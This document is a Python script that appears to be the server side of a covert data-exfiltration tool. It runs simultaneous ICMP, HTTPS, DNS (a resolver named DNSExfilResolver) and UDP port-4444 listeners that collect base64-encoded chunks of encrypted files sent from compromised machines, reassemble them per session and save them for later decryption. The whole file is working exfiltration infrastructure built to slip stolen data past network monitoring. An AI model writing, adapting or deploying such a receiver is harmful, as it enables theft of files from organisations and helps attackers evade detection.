import base64
import os
import socket
import binascii
from flask import Flask, request
from scapy.all import sniff, ICMP, get_if_list, Raw
from dnslib.server import DNSServer, BaseResolver, DNSRecord
from dnslib import RR, A, QTYPE, RCODE

AES_BLOCK_SIZE = 16

CHUNK_STORAGE = {}  # Dictionary to store received chunks
CHUNK_SIZE = 512
STORED_FILES_DIR = "stored_encrypted_files"  # Directory to store encrypted files

# Ensure storage directory exists
os.makedirs(STORED_FILES_DIR, exist_ok=True)

def save_chunk(session_id, chunk_id, total_chunks, chunk_data, process_part=False, part_id=None, total_parts=None, is_dns=False):
    """Store received chunks with DNS-specific handling for multiple parts."""
    if session_id not in CHUNK_STORAGE:
        CHUNK_STORAGE[session_id] = {}

    if process_part:
        # Prevent overwriting a fully reassembled chunk
        if chunk_id not in CHUNK_STORAGE[session_id]:
            CHUNK_STORAGE[session_id][chunk_id] = {}
        elif isinstance(CHUNK_STORAGE[session_id][chunk_id], bytes):
            print(f"[WARNING] Ignoring extra part {part_id} for fully received chunk {chunk_id}.")
            return  # Ignore further parts after full reassembly

        CHUNK_STORAGE[session_id][chunk_id][part_id] = chunk_data  # Store by part_id

        print(f"[+] Session {session_id}: Received part {part_id}/{total_parts} for chunk {chunk_id}")

        if len(CHUNK_STORAGE[session_id][chunk_id]) == total_parts:
            print(f"[DEBUG] All parts received for chunk {chunk_id}. Reassembling...")
            print(f"[DEBUG] Current chunk storage before reconstruction: {CHUNK_STORAGE[session_id][chunk_id]}")
            sorted_parts = [CHUNK_STORAGE[session_id][chunk_id][i] for i in sorted(CHUNK_STORAGE[session_id][chunk_id].keys())]
            full_chunk = "".join(sorted_parts)
            
            if is_dns:
                try:
                    missing_padding = len(full_chunk) % 4
                    if missing_padding:
                        full_chunk += "=" * (4 - missing_padding)

                    full_chunk_decoded = base64.urlsafe_b64decode(full_chunk)
                    CHUNK_STORAGE[session_id][chunk_id] = full_chunk_decoded  # Store final chunk
                    print(f"[+] Fully reassembled chunk {chunk_id}/{total_chunks} for session {session_id}")

                except Exception as e:
                    print(f"[-] Error decoding reassembled chunk {chunk_id}: {e}")
            else:
                CHUNK_STORAGE[session_id][chunk_id] = base64.b64decode(full_chunk)
                print(f"[+] Fully reassembled chunk {chunk_id}/{total_chunks} for session {session_id}")

    else:
        CHUNK_STORAGE[session_id][chunk_id] = base64.b64decode(chunk_data)
        print(f"[+] Session {session_id}: Received full chunk {chunk_id}/{total_chunks}")



def icmp_listener():
    """Listen for ICMP packets and extract chunks."""
    def extract_icmp_data(packet):
        """Extract and reassemble ICMP chunk data."""
        if packet.haslayer(ICMP) and packet[ICMP].type == 8:
            raw_data = packet[Raw].load.hex()[-32:]
            print (raw_data)
            if len(raw_data) < 16:
                return  # Ignore malformed packets
            try:
                # Extract fields from the hex payload
                session_id = raw_data[:8]  # First 8 hex characters (Session ID)
                chunk_id = int(raw_data[8:10], 16)  # Next 2 hex characters (Chunk ID)
                total_chunks = int(raw_data[10:12], 16)  # Next 2 hex characters (Total Chunks)
                part_id = int(raw_data[12:14], 16)  # Next 2 hex characters (Part ID)
                part_length = int(raw_data[14:16], 16)  # Next 2 hex characters (Part Length)
                chunk_data_hex = raw_data[16:16 + part_length]  # Remaining is actual chunk data

                if len(chunk_data_hex) != part_length:  # Validate chunk size
                    print(f"[-] Mismatch in declared and actual part length for chunk {len(chunk_data_hex)} {part_length}")
                    return

                chunk_data = binascii.unhexlify(chunk_data_hex).decode() 
                print(f"[+] Received ICMP chunk: session_id={session_id}, chunk_id={chunk_id}, total_chunks={total_chunks}, part_id={part_id}, length={part_length}")

                save_chunk(session_id, chunk_id, total_chunks, chunk_data, part_id=part_id, process_part=True, is_dns=False)

            except Exception as e:
                print(f"[-] Error processing ICMP packet: {e}")


    interfaces = get_if_list()
    sniff(iface=interfaces, filter="icmp", prn=extract_icmp_data)

def https_server():
    """HTTPS server for receiving chunks."""
    app = Flask(__name__)

    @app.route('/upload', methods=['POST'])
    def upload_chunk():
        data = request.json
        save_chunk(data["session_id"], data["chunk_id"], data["total_chunks"], data["chunk"], process_part=False, is_dns=False)
        return "OK", 200

    app.run(host="0.0.0.0", port=443, ssl_context=("server.crt", "server.key"))

def dns_server():
    """DNS Exfiltration Listener."""
    class DNSExfilResolver(BaseResolver):
        def resolve(self, request, handler):
            qname = str(request.q.qname).strip(".")

            try:
                # Split DNS query into parts
                parts = qname.split(".")
                session_id, chunk_id, total_chunks, part_id, total_parts = parts[:5]  # Extract session metadata

                # Ensure numeric values are valid
                chunk_id = int(chunk_id)
                total_chunks = int(total_chunks)
                part_id = int(part_id)
                total_parts = int(total_parts)

                chunk_data = ".".join(parts[5:-1])  # Remaining parts are chunk data

                print(f"[DEBUG] Received DNS request (length {len(qname)}): {qname}")
                print(f"[DEBUG] Extracted session_id={session_id}, chunk_id={chunk_id}, total_chunks={total_chunks}, part_id={part_id}, total_parts={total_parts}")
                print(f"[DEBUG] Received chunk part data: {chunk_data}")

                # Store chunk data with part_id for DNS
                save_chunk(session_id, chunk_id, total_chunks, chunk_data, process_part=True, part_id=part_id, total_parts=total_parts, is_dns=True)

                response_ip = "127.0.0.10"  # Success ACK response

                # Build and return a proper DNS response
                reply = DNSRecord(header=request.header)
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(response_ip)))
                reply.header.rcode = RCODE.NOERROR

                return reply

            except Exception as e:
                print(f"[-] Error parsing DNS query: {qname} - {e}")
                reply = DNSRecord(header=request.header)
                reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.20")))
                reply.header.rcode = RCODE.SERVFAIL
                return reply




    server = DNSServer(DNSExfilResolver(), port=5354, address="0.0.0.0")
    server.start_thread()

def udp_listener():
    """Listen for UDP chunks."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 4444))

    while True:
        data, addr = sock.recvfrom(1024)
        try:
            session_id, chunk_id, total_chunks, chunk = data.decode().split(".", 3)
            save_chunk(session_id, int(chunk_id), int(total_chunks), chunk, process_part=False, is_dns=False)
        except:
            pass

def reconstruct_files():
    """Reassemble received encrypted files, but do NOT decrypt."""
    for session_id, chunks in CHUNK_STORAGE.items():
        expected_chunks = max(chunks.keys()) + 1

        if len(chunks) < expected_chunks:
            missing_chunks = [i for i in range(expected_chunks) if i not in chunks]
            print(f"[-] ERROR: Session {session_id} incomplete. Missing chunks: {missing_chunks}")
            continue  # Skip storing until all chunks arrive

        ordered_data = b""

        for i in sorted(chunks.keys()):
            chunk = chunks[i]

            if isinstance(chunk, dict):
                print(f"[DEBUG] Chunk {i} is still a dictionary, reassembling...")
                sorted_parts = [chunk[part_id] for part_id in sorted(chunk.keys())]
                full_chunk = "".join(sorted_parts)

                try:
                    missing_padding = len(full_chunk) % 4
                    if missing_padding:
                        full_chunk += "=" * (4 - missing_padding)

                    chunk = base64.urlsafe_b64decode(full_chunk)
                except Exception as e:
                    print(f"[-] Error decoding chunk {i}: {e}")
                    continue  # Skip this chunk if decoding fails

            ordered_data += chunk  # Add chunk to final data

        print(f"[DEBUG] Final ordered data size before writing: {len(ordered_data)} bytes")
        if len(ordered_data) == 0:
            print("[-] WARNING: Ordered data is empty, check chunk reception!")

        encrypted_tar_file = os.path.join(STORED_FILES_DIR, f"{session_id}_received_encrypted.bin")
        with open(encrypted_tar_file, "wb") as f:
            f.write(ordered_data)

        print(f"[+] Complete encrypted file stored: {encrypted_tar_file}")
        print(f"[!] To decrypt manually, run:")
        print(f"    python decrypt_file.py {encrypted_tar_file} {session_id}")




# Start Listeners
import threading
threading.Thread(target=icmp_listener, daemon=True).start()
threading.Thread(target=https_server, daemon=True).start()
threading.Thread(target=dns_server, daemon=True).start()
threading.Thread(target=udp_listener, daemon=True).start()

# Reconstruct files every 30 seconds
import time
while True:
    time.sleep(60)
    reconstruct_files()
